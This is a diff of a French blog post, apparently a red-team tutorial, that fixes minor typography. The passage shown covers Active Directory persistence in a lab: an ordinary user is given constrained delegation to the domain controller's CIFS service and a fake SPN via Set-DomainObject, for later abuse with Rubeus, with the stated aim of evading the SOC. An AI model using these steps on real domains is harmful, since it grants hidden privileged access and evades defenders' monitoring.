@@ -335,7 +335,7 @@ Une méthode de persistance intéressante consiste, à partir d'un utilisateur c
   
 Vous êtes admin de dom, cependant les [groupes protégés](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory) sont supervisés par le SOC, ces derniers ont leurs descripteurs de sécurité remis en état par le mécanisme de ```SDProp``` ([AdminSDHolder](https://social.technet.microsoft.com/wiki/contents/articles/22331.adminsdholder-protected-groups-and-security-descriptor-propagator.aspx)), etc, autant d'éléments qui vous font dire que vous aimeriez backdooré un utilisateur qui peut passer le plus de temps possible sous les radars.  
   
-Jouons cette méthode dans notre lab. l'utilisateur ```bleponge``` est un utilisateur du domaine tout ce qui a de plus banal, ```admin01``` est ce pour quoi vous avez tant sué ces derniers jours:  
+Jouons cette méthode dans notre lab. L'utilisateur ```bleponge``` est un utilisateur du domaine tout ce qui a de plus banal, ```admin01``` est ce pour quoi vous avez tant sué ces derniers jours:  
   
 ```powershell
 PS C:\> WMIC OS Get Name
@@ -344,6 +344,7 @@ Microsoft Windows 10 Education N|C:\Windows|\Device\Harddisk0\Partition2
 
 PS C:\> whoami
 windomain\admin01
+
 PS C:\> net user admin01 /domain | Select-String "Group"
 
 Local Group Memberships
@@ -375,10 +376,6 @@ distinguishedname        : CN=Bob ble. Leponge,CN=Users,DC=windomain,DC=local
 useraccountcontrol       : NORMAL_ACCOUNT
 msds-allowedtodelegateto : {CIFS/DC, CIFS/DC.WINDOMAIN.LOCAL}
 samaccountname           : bleponge
-
-
-
-PS C:\>
 ```
   
 Attention à la commande ```Set-DomainObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```. En effet le bon sens nous dit qu'un utilisateur sera légitime pour délégeur si ce dernier apparait comme compte de service. Sans positionner de SPN sur l'utilisateur ```bleponge```, Rubeus nous a tout simplement propagé une exception non catchée:  
